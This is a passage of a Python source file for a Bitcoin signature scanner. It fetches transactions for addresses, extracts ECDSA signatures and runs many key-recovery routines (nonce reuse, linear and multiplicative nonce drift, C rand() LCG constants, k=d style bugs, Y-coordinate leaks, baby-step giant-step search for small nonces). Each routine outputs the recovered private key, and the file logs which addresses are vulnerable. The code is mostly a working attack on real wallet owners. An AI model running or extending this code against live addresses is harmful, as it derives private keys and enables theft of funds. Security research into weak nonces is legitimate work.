                    "r1": hex(r),
                    "r2": "N/A",
                    "pubkey": pk,
                    "risk": f"Predictable PRNG generation via {heuristic_name}",
                    "action": "Single-signature deterministic collapse",
                    "recovered_d": d_cand
                })
    return results

def check_sequential_iterator_collapse(this_address: str, signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    results = []
    by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    for sig in signatures:
        pk = sig.get("pubkey")
        if pk and sig.get("z_original") is not None:
            by_pub[pk].append(sig)

    for pk, sig_list in by_pub.items():
        if len(sig_list) < 2: continue
        sig_list = sig_list[:50]   # PERF: cap per-pubkey to avoid O(n²) blow-up
        found_d = None
        pair_info = None
        pairs_checked = 0
        MAX_PAIRS = 200

        for i in range(len(sig_list)):
            if found_d: break
            for j in range(i + 1, len(sig_list)):
                if found_d or pairs_checked >= MAX_PAIRS: break
                pairs_checked += 1

                sig1, sig2 = sig_list[i], sig_list[j]
                r1, s1, z1 = sig1["r"], sig1["s"], sig1["z_original"]
                r2, s2, z2 = sig2["r"], sig2["s"], sig2["z_original"]
                if r1 == r2: continue

                # Check small sequence diffs: k2 = k1 + delta, delta in [-5, +5]
                for delta in [1, 2, 3, 4, 5, -1, -2, -3, -4, -5]:
                    if found_d: break
                    for _s1 in [s1, N-s1]:
                        if found_d: break
                        for _s2 in [s2, N-s2]:
                            denom = (_s2 * r1 - _s1 * r2) % N
                            if denom != 0:
                                num = (_s1 * z2 - _s2 * z1 - _s1 * _s2 * delta) % N
                                d_cand = (num * modinv(denom, N)) % N
                                if verify_key(pk, d_cand):
                                    found_d = d_cand
                                    pair_info = (sig1, sig2)
                                    break
        if found_d:
            sig1, sig2 = pair_info
            results.append({
                "type": "Iterator Sequence Drift",
                "r1": hex(sig1["r"]),
                "r2": hex(sig2["r"]),
                "pubkey": pk,
                "risk": "Nonce generated linearly (k2 = k1 + X).",
                "action": "Mathematically collapsed Iterator loop.",
                "recovered_d": found_d
            })
    return results

# ── 10i. Psycho-Algebraic Developer Leakage (PADL) (NEW) ──────────────────────

def check_homebrew_crypto_suicide_bugs(this_address: str, signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    results = []
    
    for sig in signatures[:300]:   # PERF: cap to avoid slow modinv loops on large sig sets
        r, s, z, pk = sig.get("r"), sig.get("s"), sig.get("z_original"), sig.get("pubkey")
        if r is None or s is None or z is None or pk is None: continue
        
        found_d = None
        bug_type = ""
        
        for _s in [s, N - s]:
            if found_d: break

            # Vectors 1 & 2 share denominator (_s - r); compute inverse once.
            denom = (_s - r) % N
            if denom != 0:
                inv_denom = modinv(denom, N)
                # Vector 1: k = d  →  d*(s-r) = z  →  d = z / (s-r)
                d_cand = (z * inv_denom) % N
                if verify_key(pk, d_cand):
                    found_d, bug_type = d_cand, "PADL: k = d"
                    break
                # Vector 2: k = z+d  →  d*(s-r) = z*(1-s)  →  d = z*(1-s)/(s-r)
                d_cand = (z * (1 - _s) % N * inv_denom) % N
                if verify_key(pk, d_cand):
                    found_d, bug_type = d_cand, "PADL: k = z + d"
                    break

            # Vector 3: Multiplicative k = z*d  →  d*(s*z-r) = z  →  d = z/(s*z-r)
            denom_3 = (_s * z - r) % N
            if denom_3 != 0:
                d_cand = (z * modinv(denom_3, N)) % N
                if verify_key(pk, d_cand):
                    found_d, bug_type = d_cand, "PADL: k = z * d"
                    break

        if found_d:
            results.append({
                "type": bug_type,
                "r1": hex(r),
                "r2": "N/A",
                "pubkey": pk,
                "risk": f"Severe algebraic logic bleed: {bug_type}",
                "action": "Mathematically collapsed via Single-Signature suicide fraction.",
                "recovered_d": found_d
            })

    return results

def check_state_bleeding_feedback_loop(this_address: str, signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    # Developers writing batch sig loops sometimes accidentally feed previous outputs (s or r) into the next nonce.
    results = []
    by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    for sig in signatures:
        pk = sig.get("pubkey")
        if pk and sig.get("z_original") is not None:
            by_pub[pk].append(sig)
            
    for pk, sig_list in by_pub.items():
        if len(sig_list) < 2: continue
        found_d = None
        pair_info = None
        bug_type = ""
        
        # BUG FIX: Sort by block_height + tx_order (temporal) instead of z_original (random hash)
        sig_list_sorted = sorted(sig_list, key=lambda x: (x.get("block_height", 0), x.get("tx_order", 0)))
        
        for i in range(len(sig_list_sorted) - 1):
            if found_d: break
            sig_prev = sig_list_sorted[i]
            sig_next = sig_list_sorted[i+1]
            
            r_prev, s_prev = sig_prev["r"], sig_prev["s"]
            r_next, s_next, z_next = sig_next["r"], sig_next["s"], sig_next["z_original"]
            
            hx_sp = hex(s_prev)[2:].zfill(64)
            s_hash = int(hashlib.sha256(bytes.fromhex(hx_sp)).hexdigest(), 16) % N
            
            for test_k, name in [(s_prev, "k2 = s1"), (N-s_prev, "k2 = -s1"), (r_prev, "k2 = r1"), (s_hash, "k2 = hash(s1)")]:
                if test_k == 0: continue
                
                # Verify the mapping by attempting recovery
                d_cand = ((s_next * test_k - z_next) * modinv(r_next, N)) % N
                if verify_key(pk, d_cand):
                    found_d = d_cand
                    bug_type = f"State-Bleeding Loop: {name}"
                    pair_info = (sig_prev, sig_next)
                    break
                    
        if found_d:
            sig1, sig2 = pair_info
            results.append({
                "type": bug_type,
                "r1": hex(sig1["r"]),
                "r2": hex(sig2["r"]),
                "pubkey": pk,
                "risk": "Batch signing thread leaked public states into internal RNG.",
                "action": "Private Key compromised by chronological state recovery.",
                "recovered_d": found_d
            })
            
    return results

# ── 10j. High-Yield Cryptographic Illusions (NEW) ─────────────────────────────

def check_y_coordinate_ghost_trap(this_address: str, signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    # Reconstructs the discarded Y-coordinate from R and uses it to trap nonces seeded from "secret" Y values.
    results = []
    p_curve = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
    by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    for sig in signatures:
        pk = sig.get("pubkey")
        if pk and sig.get("z_original") is not None:
            by_pub[pk].append(sig)

    for pk, sig_list in by_pub.items():
        if len(sig_list) < 2: continue
        found_d = None
        pair_info = None

        sig_list_sorted = sorted(sig_list, key=lambda x: (x.get("block_height", 0), x.get("tx_order", 0)))
        for i in range(len(sig_list_sorted) - 1):
            if found_d: break
            sig_prev = sig_list_sorted[i]
            sig_next = sig_list_sorted[i+1]
            
            r_prev = sig_prev["r"]
            r_next, s_next, z_next = sig_next["r"], sig_next["s"], sig_next["z_original"]

            # Reconstruct Y1 from R1 (y^2 = x^3 + 7)
            y_sq = (pow(r_prev, 3, p_curve) + 7) % p_curve
            
            if legendre_symbol(y_sq, p_curve) == 1:
                y_ghost = modular_sqrt(y_sq, p_curve)
                for test_y in [y_ghost, p_curve - y_ghost]:
                    if test_y == 0: continue
                    test_k = test_y % N
                    
                    d_cand = ((s_next * test_k - z_next) * modinv(r_next, N)) % N
                    if verify_key(pk, d_cand):
                        found_d = d_cand
                        pair_info = (sig_prev, sig_next)
                        break

        if found_d:
            results.append({
                "type": "Y-Bleed Ghost Trap",
                "r1": hex(pair_info[0]["r"]),
                "r2": hex(pair_info[1]["r"]),
                "pubkey": pk,
                "risk": "Publicly reconstructed Y-Coordinate leaked into PRNG.",
                "action": "Private Key extracted algebraically via Modular Square Root.",
                "recovered_d": found_d
            })
    return results

def check_multiplicative_scalar_bleed(this_address: str, signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    # Attempts to collapse PRNG loops where developers multiply the nonce as "obfuscation" (k2 = C * k1)
    results = []
    by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    for sig in signatures:
        pk = sig.get("pubkey")
        if pk and sig.get("z_original") is not None:
            by_pub[pk].append(sig)

    for pk, sig_list in by_pub.items():
        if len(sig_list) < 2: continue
        sig_list = sig_list[:50]   # PERF: cap per-pubkey to avoid O(n²) blow-up
        found_d = None
        pair_info = None
        scalar_hit = 0
        pairs_checked = 0
        MAX_PAIRS = 200

        for i in range(len(sig_list)):
            if found_d: break
            for j in range(i + 1, len(sig_list)):
                if found_d or pairs_checked >= MAX_PAIRS: break
                pairs_checked += 1
                
                sig1, sig2 = sig_list[i], sig_list[j]
                r1, s1, z1 = sig1["r"], sig1["s"], sig1["z_original"]
                r2, s2, z2 = sig2["r"], sig2["s"], sig2["z_original"]
                if r1 == r2: continue

                # Evaluate scalar drifts up to x10 — BOTH directions:
                # k1 = C·k2: d = (C·s1·z2 − s2·z1) / (s2·r1 − C·s1·r2)
                # k2 = C·k1: d = (s1·z2 − C·s2·z1) / (C·s2·r1 − s1·r2)  [previously missing]
                for C in [2, 3, 4, 5, 6, 7, 8, 9, 10]:
                    if found_d: break
                    for _s1 in [s1, N-s1]:
                        if found_d: break
                        for _s2 in [s2, N-s2]:
                            # Direction 1: k1 = C·k2
                            denom_a = (_s2 * r1 - C * _s1 * r2) % N
                            if denom_a != 0:
                                d_cand = ((C * _s1 * z2 - _s2 * z1) * modinv(denom_a, N)) % N
                                if verify_key(pk, d_cand):
                                    found_d = d_cand; pair_info = (sig1, sig2); scalar_hit = C; break
                            # Direction 2: k2 = C·k1  (previously missing)
                            denom_b = (C * _s2 * r1 - _s1 * r2) % N
                            if denom_b != 0:
                                d_cand = ((_s1 * z2 - C * _s2 * z1) * modinv(denom_b, N)) % N
                                if verify_key(pk, d_cand):
                                    found_d = d_cand; pair_info = (sig1, sig2); scalar_hit = C; break
        if found_d:
            results.append({
                "type": f"Multiplicative Scalar Drift (k2 = {scalar_hit} * k1)",
                "r1": hex(pair_info[0]["r"]),
                "r2": hex(pair_info[1]["r"]),
                "pubkey": pk,
                "risk": "Geometrically scaled nonces offer no algebraic security.",
                "action": "Collapsing via linear substitution.",
                "recovered_d": found_d
            })
    return results

# ── 10k. Embedded Hardware LCG Compiler Collapse (NEW) ──────────────────────────

def check_embedded_lcg_compiler_collapse(this_address: str, signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    # Attempts to extract the key by fingerprinting the PRNG state loop back to standard C/C++ rand() compiler values.
    results = []
    by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    for sig in signatures:
        pk = sig.get("pubkey")
        if pk and sig.get("z_original") is not None:
            by_pub[pk].append(sig)
            
    # Matrix mapping of standard world compiler constants: (A, C)
    COMPILERS = {
        "GCC / glibc (Linux)": (1103515245, 12345),
        "MS visual C++ (Windows)": (214013, 2531011),
        "Apple / macOS Carbon": (16807, 0),
        "Java (java.util.Random)": (25214903917, 11),
        "Borland C/C++": (22695477, 1)
    }

    for pk, sig_list in by_pub.items():
        if len(sig_list) < 2: continue
        found_d = None
        pair_info = None
        target_compiler = ""

        sig_list_sorted = sorted(sig_list, key=lambda x: (x.get("block_height", 0), x.get("tx_order", 0)))
        for i in range(len(sig_list_sorted) - 1):
            if found_d: break
            sig_prev = sig_list_sorted[i]
            sig_next = sig_list_sorted[i+1]
            
            r1, s1, z1 = sig_prev["r"], sig_prev["s"], sig_prev["z_original"]
            r2, s2, z2 = sig_next["r"], sig_next["s"], sig_next["z_original"]
            if r1 == r2: continue

            for compiler_name, (A, C) in COMPILERS.items():
                if found_d: break
                for _s1 in [s1, N-s1]:
                    if found_d: break
                    for _s2 in [s2, N-s2]:
                        denom = (_s2 * A * r1 - _s1 * r2) % N
                        if denom != 0:
                            num = (_s1 * z2 - _s2 * A * z1 - _s1 * _s2 * C) % N
                            d_cand = (num * modinv(denom, N)) % N
                            if verify_key(pk, d_cand):
                                found_d = d_cand
                                target_compiler = compiler_name
                                pair_info = (sig_prev, sig_next)
                                break
                                
        if found_d:
            results.append({
                "type": f"Compiler LCG Bleed ({target_compiler})",
                "r1": hex(pair_info[0]["r"]),
                "r2": hex(pair_info[1]["r"]),
                "pubkey": pk,
                "risk": f"IoT device utilized standard {target_compiler} rand() for PRNG.",
                "action": "Mathematically collapsed via Linear Congruential Matrix.",
                "recovered_d": found_d
            })
    return results

# ==============================================================================
# PART 11: RECOVERY FORMULAS
# ==============================================================================

def modinv(a: int, m: int = N) -> int:
    try:
        return pow(a % m, -1, m)
    except ValueError:
        raise ValueError(f"modinv: {a} has no inverse mod {m} (gcd != 1)")

def legendre_symbol(a: int, p: int) -> int:
    ls = pow(a, (p - 1) // 2, p)
    return -1 if ls == p - 1 else ls

def modular_sqrt(a: int, p: int) -> int:
    if legendre_symbol(a, p) != 1: return 0
    elif a == 0: return 0
    elif p == 2: return a
    elif p % 4 == 3: return pow(a, (p + 1) // 4, p)
    s = p - 1
    e = 0
    while s % 2 == 0:
        s //= 2
        e += 1
    n = 2
    while legendre_symbol(n, p) != -1: n += 1
    x = pow(a, (s + 1) // 2, p)
    b = pow(a, s, p)
    g = pow(n, s, p)
    r = e
    while True:
        t = b
        # BUG FIX: Use separate counter `m_cnt` instead of reusing loop variable `m`.
        # Original code: `for m in range(r)` — if loop exhausts, m = r-1 and we
        # fall through with wrong root. Now we detect exhaustion explicitly.
        m_cnt = 0
        for m_cnt in range(r):
            if t == 1: break
            t = pow(t, 2, p)
        else:
            # Loop completed without break — t never reached 1.
            # This means `a` has no sqrt mod p (shouldn't happen if Legendre passed).
            return 0
        if m_cnt == 0: return x
        gs = pow(g, 2 ** (r - m_cnt - 1), p)
        g = (gs * gs) % p
        x = (x * gs) % p
        b = (b * g) % p
        r = m_cnt

# ==============================================================================
# CKC (Cross-Key Collision) — PART 11.5
# Paper: Definition 1 — s₂·Q₁ − s₁·Q₂ = (s₁z₂ − s₂z₁)·r⁻¹·G
# Pure public-data check: confirms shared nonce without knowing any private key.
# Closes three gaps the file-based engine misses:
#   Gap 1 — DB orphans (r-dup formed after first address was marked done)
#   Gap 2 — one sig has z=N/A (chain from already-recovered side)
#   Gap 3 — s₁==s₂ pairs (attempt_bootstrap skips, sign-flip catches them)
# ==============================================================================

def pub_hex_to_point(pub_hex: str):
    """Convert compressed/uncompressed hex pubkey to an ecdsa ellipticcurve Point.
    Returns None (instead of raising) when the pubkey is invalid or off-curve,
    so callers like pollards_kangaroo can skip gracefully via their None-check.
    Root cause: a compressed key whose x-coord has no square root mod p (i.e. it is
    not a valid secp256k1 point) caused ecdsa to raise MalformedPointError/
    SquareRootError and crash the entire Phase-4 loop.
    """
    try:
        pub_bytes = bytes.fromhex(pub_hex)
        if pub_bytes[0] == 0x04 and len(pub_bytes) == 65:
            from ecdsa.ellipticcurve import Point
            x = int.from_bytes(pub_bytes[1:33], 'big')
            y = int.from_bytes(pub_bytes[33:65], 'big')
            return Point(curve.curve, x, y, curve.order)
        else:
            vk = ecdsa.VerifyingKey.from_string(pub_bytes, curve=curve)
            return vk.pubkey.point
    except Exception:
        return None

def verify_ckc_equation(r: int, s1: int, z1: int, pub1_hex: str,
                         s2: int, z2: int, pub2_hex: str) -> bool:
    """
    CKC verification (Definition 1 from the paper).
    Checks: s2·Q1 - s1·Q2 == (s1·z2 - s2·z1)·r⁻¹·G
    Returns True only if both signatures share the same nonce k.
    Requires no private key — pure public-data check.
    Works for same pubkey (→ standard nonce reuse) and different pubkeys (→ cross-key).
    """
    try:
        r_inv  = modinv(r, N)
        scalar = ((s1 * z2 - s2 * z1) * r_inv) % N
        Q1     = pub_hex_to_point(pub1_hex)
        Q2     = pub_hex_to_point(pub2_hex)
        gen    = curve.generator
        # s2·Q1 - s1·Q2  using scalar negation: -s1·Q2 ≡ (N-s1)·Q2
        lhs    = s2 * Q1 + (N - s1) * Q2
        rhs    = scalar * gen
        return lhs == rhs
    except Exception:
        return False

def _try_ckc_confirm(r_val: int, group: List[Dict[str, Any]]) -> bool:
    """
    Gate for check_cross_key_r_reuse: confirm shared nonce via CKC point math
    before flagging a group. Returns True when confirmed (or when we lack
    the data to confirm and must fall through).
    """
    by_pub: Dict[str, Dict[str, Any]] = {}
    for item in group:
        pk = item.get("pubkey")
        if pk and pk != "N/A" and item.get("z_original") and item.get("s"):
            if pk not in by_pub:
                by_pub[pk] = item
        if len(by_pub) >= 2:
            break
    pubs = list(by_pub.keys())
    if len(pubs) < 2:
        return True   # no data to verify — allow through
    a, b = by_pub[pubs[0]], by_pub[pubs[1]]
    return verify_ckc_equation(
        r_val,
        a["s"], a["z_original"], pubs[0],
        b["s"], b["z_original"], pubs[1]
    )

try:
    import coincurve as _coincurve
    _USE_COINCURVE = True
    print("[perf] coincurve (libsecp256k1) detected — verify_key is ~100× faster.")
except ImportError:
    _USE_COINCURVE = False
    print("[perf] TIP: install coincurve for ~100× faster key verification: pip install coincurve")

# LRU cache: same (pub, priv) pair may be tested by multiple check functions
@functools.lru_cache(maxsize=8192)
def verify_key(pub_hex: str, priv_int: int) -> bool:
    if priv_int <= 0 or priv_int >= N:
        return False
    try:
        if _USE_COINCURVE:
            # coincurve wraps libsecp256k1 — ~100× faster than pure-Python ecdsa
            priv_bytes = priv_int.to_bytes(32, 'big')
            pk = _coincurve.PublicKey.from_secret(priv_bytes)
            compressed = not (pub_hex.startswith('04') and len(pub_hex) == 130)
            return pk.format(compressed=compressed).hex() == pub_hex.lower()
        else:
            sk = ecdsa.SigningKey.from_secret_exponent(priv_int, curve=curve)
            pt = sk.verifying_key.pubkey.point
            x  = pt.x().to_bytes(32, 'big')
            if pub_hex.startswith('04') and len(pub_hex) == 130:
                y = pt.y().to_bytes(32, 'big')
                return (b'\x04' + x + y).hex() == pub_hex.lower()
            else:
                prefix = b'\x02' if pt.y() % 2 == 0 else b'\x03'
                return (prefix + x).hex() == pub_hex.lower()
    except Exception:
        return False

def attempt_bootstrap(r: int, s1: int, z1: int, s2: int, z2: int) -> List[int]:
    """Standard nonce reuse: same key, same r, two (s,z) pairs."""
    candidates = []
    for _s1 in [s1, N-s1]:
        for _s2 in [s2, N-s2]:
            if _s1 == _s2: continue
            try:
                k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
                d = ((_s1 * k - z1) * modinv(r, N)) % N
                candidates.append(d)
            except ValueError:
                pass
    return candidates


def attempt_complementary_recovery(r: int, s1: int, z1: int, s2: int, z2: int) -> List[int]:
    """
    BUG FIX: This function was called but never defined, causing a NameError crash.
    Complementary nonce recovery: when s1 + s2 ≡ 0 (mod N), meaning k and -k were used.
    In this case k2 = N - k1, so:
      s1 = (z1 + r*d) / k        →  k = (z1 + r*d) / s1
      s2 = (z2 + r*d) / (N - k)  →  (N-k) = (z2 + r*d) / s2  →  k = N - (z2 + r*d)/s2
    Setting equal:  (z1 + r*d)/s1 = N - (z2 + r*d)/s2
      →  s2*(z1 + r*d) + s1*(z2 + r*d) = s1*s2*N  (≡ 0 mod N)
      →  s2*z1 + s2*r*d + s1*z2 + s1*r*d = 0   mod N
      →  d*(s1 + s2)*r = -(s2*z1 + s1*z2)       mod N
    Since s1 + s2 ≡ 0, we use sign-flipped variants of s.
    """
    candidates = []
    for _s1 in [s1, N-s1]:
        for _s2 in [s2, N-s2]:
            # k2 = -k1:  s2 = (z2 + r*d) * (-k1)^-1
            # From s1*k1 = z1 + r*d  and  s2*(-k1) = z2 + r*d
            # → s1*k1 - z1 = -s2*k1 - z2  → k1*(s1 + s2) = z1 - z2
            denom_k = (_s1 + _s2) % N
            if denom_k == 0:
                continue
            try:
                k = ((z1 - z2) * modinv(denom_k, N)) % N
                if k == 0:
                    continue
                d = ((_s1 * k - z1) * modinv(r, N)) % N
                candidates.append(d)
            except ValueError:
                pass
    return candidates


def attempt_chain(r: int, s_known: int, z_known: int, d_known: int, s_target: int, z_target: int) -> List[int]:
    """Chain recovery: use a known (d, s, z) to find d for another sig with same r."""
    candidates = []
    for _sk in [s_known, N-s_known]:
        try:
            k = ((z_known + r * d_known) * modinv(_sk, N)) % N
            for _st in [s_target, N-s_target]:
                d2 = ((_st * k - z_target) * modinv(r, N)) % N
                candidates.append(d2)
        except ValueError:
            pass
    return candidates

def brute_force_k(r: int, s: int, z: int, pub: str, max_k: int) -> Optional[Tuple[int, int]]:
    # BUG FIX: Replaced linear O(k) point iteration with Baby-Step Giant-Step.
    # Time complexity reduced to O(sqrt(k)). Solves k up to 2^40 in seconds.
    try:
        r_inv = modinv(r, N)
        pub_pt = pub_hex_to_point(pub)
    except Exception:
        return None
        
    if pub_pt is None:
        return None

    s_candidates = list({s, N - s})
    gen = curve.generator

    m = int(math.isqrt(max_k)) + 1

    for _s in s_candidates:
        A = (_s * r_inv) % N
        B = (-z * r_inv) % N
        
        AG = A * gen
        neg_B = (N - B) % N
        target_pt = pub_pt + (neg_B * gen)
        
        # Baby steps map: { point_x: j }
        # Uses uncompressed format or just point.x() for dictionary matching to save memory
        baby_steps = {}
        current_step = AG  # start at 1 * AG
        for j in range(1, m + 1):
            baby_steps[current_step.x()] = j
            current_step = current_step + AG
            
        mAG = current_step  # (m+1)*AG, wait, we need m*AG
        mAG = (m * A) % N * gen
        
        neg_mAG = ecdsa.ellipticcurve.Point(curve.curve, mAG.x(), (curve.curve.p() - mAG.y()) % curve.curve.p())
        
        giant_step = target_pt
        for i in range(m):
            if giant_step.x() in baby_steps:
                # Need to verify y-coordinate matches
                j = baby_steps[giant_step.x()]
                # Verify exact point match: giant_step == j * AG
                # Which means: target_pt - i * m * AG == j * AG -> target_pt = (i*m + j) * AG
                k = i * m + j
                if k <= max_k:
                    d = (A * k + B) % N
                    if d > 0 and verify_key(pub, d):
                        return k, d
            giant_step = giant_step + neg_mAG

# ==============================================================================
# PART 12: SAVE FUNCTIONS
# ==============================================================================

def save_rnonce(vulns: List[Dict[str, Any]], address: str):
    """
    Append-only writer for nonce-reuse reports.
    Only new r groups (not previously written) are appended to disk.
    This avoids rewriting the entire file on every address scan.
    """
    if not vulns: return
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # Collect new r entries from this scan's vulnerabilities
    new_r_keys: Set[str] = set()
    for v in vulns:
        if v["type"] not in ("Reused Nonce", "Cross-Key Reuse", "Reused R (Unknown Key)"): continue
        r_hex = v["r"][2:] if v["r"].startswith("0x") else v["r"]
        for occ in v.get("occurrences", []):
            txid = occ.get("txid") or "N/A"
            pk   = occ.get("pubkey") or "N/A"
            key  = f"{txid}|{pk}"
            if key not in SAVED_R_GROUPS[r_hex]:
                SAVED_R_GROUPS[r_hex].append(key)
        new_r_keys.add(r_hex)

    # ── Append only NEW r groups to the human-readable file ──────────────────
    with open(OUTPUT_R_NONCE, "a", encoding="utf-8") as f:
        for r_hex in new_r_keys:
            if _wrg_contains(r_hex):
                continue   # already written; don't duplicate
            occ_list = SAVED_R_GROUPS[r_hex]
            f.write("=" * 80 + "\n")
            f.write("Reused Nonce Group\n")
            f.write("=" * 80 + "\n")
            f.write(f"r: {r_hex}\n")
            f.write("Occurrences:\n")
            for key in occ_list:
                txid, pk = key.split("|", 1)
                f.write(f" - txid={txid} pubkey={pk}\n")
            f.write("\n")
            _wrg_add(r_hex)

    # ── Append only NEW r groups to the parser-friendly file ─────────────────
    with open(OUTPUT_R_NON, "a", encoding="utf-8") as f:
        for r_hex in new_r_keys:
            r_int  = int(r_hex, 16)
            group  = db_get_sigs_by_r(r_int)
            if len(group) < 2: continue
            # Only write entries that aren't already in the file
            # We use the written_r_groups DB table as the gate for the rnon file too
            write_key = f"rnon:{r_hex}"
            if _wrg_contains(write_key):
                continue
            f.write("=" * 80 + "\n")
            f.write("Reused Nonce Group\n")
            f.write("=" * 80 + "\n")
            f.write(f"r: {r_hex}\n")
            f.write("Occurrences:\n")
            seen = set()
            for item in group:
                txid  = item.get("txid","N/A")
                pk    = item.get("pubkey") or "N/A"        # None → "N/A"
                s_val = item.get("s","N/A")
                vin   = item.get("vin_idx", 0)
                key   = (txid, vin, item.get("signer_idx", 0))
                if key in seen: continue
                seen.add(key)
                s_hex = hex(s_val)[2:] if isinstance(s_val, int) else str(s_val)
                z_val = item.get("z_original")
                z_hex = hex(z_val)[2:] if z_val is not None else "N/A"
                f.write(f" - txid={txid} s={s_hex} z={z_hex} pubkey={pk}\n")
            f.write("\n")
            _wrg_add(write_key)

# ==============================================================================
# PART 13: MAIN ANALYSIS FUNCTION
# ==============================================================================

def analyze_address(address: str) -> Optional[Dict[str, Any]]:
    global SCANNED_ADDRESSES, VULNERABLE_ADDRESSES, CURRENT_ADDRESS

    # Resume support — skip if already in DB
    if not FORCE_RESCAN and db_already_scanned(address):
        print(f"[skip] {address} already scanned (in DB)")
        return None

    CURRENT_ADDRESS = address
    SCANNED_ADDRESSES += 1
    display_stats()

    report: Dict[str, Any] = {
        "address": address,
        "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "transaction_count": 0, "signature_count": 0, "vulnerabilities": [],
    }

    txs = fetch_all_transactions(address)
    report["transaction_count"] = len(txs)
    sigs = extract_signatures(txs)
    report["signature_count"] = len(sigs)
    print(f"  Extracted {len(sigs)} signatures from {len(txs)} txs")

    # Batch insert all sigs in ONE executemany call instead of 657 individual INSERTs
    if DB_CONN and sigs:
        now = datetime.now().isoformat()
        rows = [
            (address, g.get("txid",""), g.get("vin",0),
             g.get("pubkey") or None,          # NULL in DB, not empty string
             hex(g["r"])[2:].zfill(64), hex(g["s"])[2:].zfill(64),
             hex(g["z_original"])[2:].zfill(64) if g.get("z_original") is not None else None,
             g.get("sig_type","standard"), g.get("signer_idx",0), now)
            for g in sigs
        ]
        try:
            DB_CONN.executemany(
                "INSERT INTO signatures "
                "(address,txid,vin_idx,pubkey,r_hex,s_hex,z_hex,sig_type,signer_idx,scanned_at) "
                "VALUES (?,?,?,?,?,?,?,?,?,?) "
                "ON CONFLICT(txid,vin_idx,signer_idx) DO UPDATE SET "
                "pubkey=CASE WHEN excluded.pubkey IS NOT NULL AND signatures.pubkey IS NULL "
                "           THEN excluded.pubkey ELSE signatures.pubkey END, "
                "z_hex =CASE WHEN excluded.z_hex  IS NOT NULL AND signatures.z_hex  IS NULL "
                "           THEN excluded.z_hex  ELSE signatures.z_hex  END",
                rows
            )
            global _NEW_SIGS_SINCE_SWEEP
            _NEW_SIGS_SINCE_SWEEP += len(rows)   # PERF: track inserts for smart sweep skipping
        except Exception:
            pass
        
    # Commit required here so subsequent vulnerability checks can fetch these signatures
    # BUG FIX: removed stale db_get_sigs_by_r.cache_clear() — LRU cache was removed
    # entirely to prevent cross-address reuse from being masked by cached results.
    if DB_CONN:
        DB_CONN.commit()

    vulns: List[Dict[str, Any]] = []

    # ── Run checks ───────────────────────────────────────────────────────────

    # 1. Known weak R (O(n) set lookup)
    weak_r = check_known_weak_r(sigs)
    if weak_r:
        vulns.extend(weak_r)
        VULN_COUNTS["Known Weak R"] += len(weak_r)
        print(f"  [!] {len(weak_r)} known-weak r values found for {address}")

    # 2. MSB/LSB Nonce Bias (O(n) per pubkey group)
    bias = check_nonce_bias(sigs)
    if bias:
        vulns.extend(bias)
        VULN_COUNTS["Nonce Bias"] += len(bias)
        print(f"  [!] {len(bias)} RNG bias patterns detected for {address}! Lattice vulnerable.")

    # 3. Same-key nonce reuse (batch indexed DB query)
    reused = check_reused_nonce_global(address, sigs)
    if reused:
        vulns.extend(reused)
        for rv in reused:
            VULN_COUNTS[rv["type"]] += 1
        same_key = sum(1 for rv in reused if rv["type"] == "Reused Nonce")
        unknown  = sum(1 for rv in reused if rv["type"] == "Reused R (Unknown Key)")
        if same_key:
            print(f"  [!] {same_key} same-key reused nonce group(s) for {address}")
        if unknown:
            print(f"  [!] {unknown} unknown-pubkey r-reuse group(s) for {address}")

    # 4. Cross-key R reuse (batch indexed DB query)
    cross = check_cross_key_r_reuse(address, sigs)
    if cross:
        vulns.extend(cross)
        VULN_COUNTS["Cross-Key Reuse"] += len(cross)
        print(f"  [!] {len(cross)} cross-key R reuse groups for {address}")

    # 5. Multisig cross-signer nonce reuse (O(n) grouping)
    ms = check_multisig_nonce_reuse(sigs)
    if ms:
        vulns.extend(ms)
        VULN_COUNTS["Multisig Nonce"] += len(ms)
        print(f"  [!] {len(ms)} multisig nonce reuse groups for {address}")

    if vulns:
        VULNERABLE_ADDRESSES += 1
        report["vulnerabilities"] = vulns

    REPORTS.append(report)
    save_rnonce(vulns, address)
    db_mark_address_scanned(address, len(txs), len(sigs), len(vulns))

    print(f"  [delay] 1.5s pause after {address}")
    time.sleep(1.5)
    return report

# ==============================================================================
# PART 14: CRYPTO ADDRESS UTILS (unchanged)
# ==============================================================================

def bech32_polymod(values):
    gen = [0x3b6a57b2,0x26508e6d,0x1ea119fa,0x3d4233dd,0x2a1462b3]
    chk = 1
    for v in values:
        top = chk >> 25
        chk = (chk & 0x1ffffff) << 5 ^ v
        for i in range(5):
            chk ^= gen[i] if ((top >> i) & 1) else 0
    return chk

def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_create_checksum(hrp, data):
    poly = bech32_polymod(bech32_hrp_expand(hrp) + data + [0]*6) ^ 1
    return [(poly >> 5*(5-i)) & 31 for i in range(6)]

def bech32_encode(hrp, data):
    combined = data + bech32_create_checksum(hrp, data)
    return hrp + '1' + ''.join(CHARSET[d] for d in combined)

def convertbits(data, frombits, tobits, pad=True):
    acc, bits, ret, maxv = 0, 0, [], (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits): return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits: ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        return None
    return ret

def base58_encode(b):
    ALPHA = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    x = int.from_bytes(b, "big")
    out = []
    while x > 0:
